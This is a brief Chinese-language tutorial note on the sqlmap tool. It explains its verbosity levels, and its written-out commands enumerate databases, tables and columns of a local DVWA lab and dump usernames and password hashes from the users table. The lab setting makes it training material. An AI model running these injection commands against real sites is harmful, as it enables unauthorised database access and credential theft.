# python-network-programming
### sqlmap笔记
#### sqlmap日志级别
```text
sqlmap -v
```
信息级别: 0-6 （缺省1），其值具体含义：  
0只显示python错误以及严重的信息；  
1同时显示基本信息和警告信息（默认）；  
2同时显示debug信息；  
3同时显示注入的payload；  
4同时显示HTTP请求；  
5同时显示HTTP响应头；  
6同时显示HTTP响应页面；  
如果想看到sqlmap发送的测试payload最好的等级就是3。
#### 查看数据库
```text
python sqlmap.py -u "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="security=low; PHPSESSID=26ct5bdhinubutlthkgd8krov6" --dbs
```
#### 查看表
```text
python sqlmap.py -u "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="security=low; PHPSESSID=26ct5bdhinubutlthkgd8krov6" -D dvwa --tables
```
#### 查看字段
```text
C:\soft\sqlmap>python sqlmap.py -u "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="security=low; PHPSESSID=26ct5bdhinubutlthkgd8krov6" -D dvwa -T users
--columns
```
#### 查看数据
```text
C:\soft\sqlmap>python sqlmap.py -u "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="security=low; PHPSESSID=26ct5bdhinubutlthkgd8krov6" -D dvwa -T users
-C user,password --dump
```
#### 参数
-u 后面接url  
-l 后面接日志文件，如burpsuite的日志文件  
-r 从文件中加载http请求，加载https请求需要–force-ssl  
--cookie 加载cookie值  
--user-agent 加载UA  
--proxy 加载代理  
–level=LEVEL  执行测试的等级（1-5，默认为1）  
–risk=RISK  执行测试的风险（0-3，默认为1）  

